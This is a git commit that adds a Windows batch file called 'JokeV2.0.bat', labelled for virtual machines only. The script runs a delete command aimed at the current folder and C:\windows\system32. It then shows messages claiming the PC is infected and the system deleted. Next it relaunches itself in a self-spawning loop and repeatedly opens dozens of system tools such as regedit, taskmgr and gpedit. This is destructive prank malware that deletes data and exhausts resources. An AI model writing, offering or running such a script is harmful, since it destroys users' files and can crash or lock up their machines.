fd8afa770da50c94696f4cd0adf1f56984c5ed1c
Lisandro 07 Files And Windows <97541842+Lisandro07e@users.noreply.github.com>
2024-01-07 20:09:53 -0300

    JokeV2.0.bat
    ¡Only In a Virtual Machine!

---
+++ JokeV2.0.bat
@@ -0,0 +1,54 @@
+del * C:\windows\system32
+
+msg * Your PC Is Infected and also your system is deleted good lock fixing now your system
+msg * its creator is not responsible for the execution of the file
+msg * Bye
+start JokeV2.0.bat
+start cmd
+start notepad.exe
+start winver.exe
+start conhost.exe
+start iexplore.exe
+start wmplayer.exe
+start mmc.exe
+start services.msc
+start taskmgr.exe
+start regedit.exe
+start control.exe
+start gpedit.msc
+start cmd
+start notepad.exe
+start winver.exe
+start conhost.exe
+start iexplore.exe
+start wmplayer.exe
+start mmc.exe
+start services.msc
+start taskmgr.exe
+start regedit.exe
+start control.exe
+start gpedit.msc
+start cmd
+start notepad.exe
+start winver.exe
+start conhost.exe
+start iexplore.exe
+start wmplayer.exe
+start mmc.exe
+start services.msc
+start taskmgr.exe
+start regedit.exe
+start control.exe
+start gpedit.msc
+start cmd
+start notepad.exe
+start winver.exe
+start conhost.exe
+start iexplore.exe
+start wmplayer.exe
+start mmc.exe
+start services.msc
+start taskmgr.exe
+start regedit.exe
+start control.exe
+start gpedit.msc
